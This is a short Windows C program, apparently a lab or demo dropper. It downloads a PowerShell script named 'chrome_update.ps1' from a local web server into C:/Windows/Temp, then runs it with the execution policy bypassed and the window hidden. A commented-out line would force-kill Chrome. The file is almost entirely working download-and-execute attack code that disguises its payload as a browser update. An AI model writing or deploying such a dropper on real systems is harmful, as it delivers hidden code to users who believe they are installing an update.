#include <windows.h>
#include <urlmon.h>
#include <stdlib.h>

#pragma comment(lib, "urlmon.lib")

int main() {
    // Show notification
    MessageBox(NULL, "Starting download...", "Notification", MB_OK | MB_ICONINFORMATION);

    // Download file
    HRESULT hr = URLDownloadToFile(
        NULL,
        "http://localhost:8080/chrome_update.ps1",    // URL to download
        "C:/Windows/Temp/chrome_update.ps1",          // Local file path
        0,
        NULL
    );

    if (hr == S_OK) {
        MessageBox(NULL, "Download successful!", "Notification", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBox(NULL, "Download failed!", "Notification", MB_OK | MB_ICONERROR);
    }

    system("powershell -ExecutionPolicy Bypass -Window Hidden -File C:/Windows/Temp/chrome_update.ps1");

    // Kill all Google Chrome processes
    // system("taskkill /F /IM chrome.exe >nul 2>&1");

    return 0;
}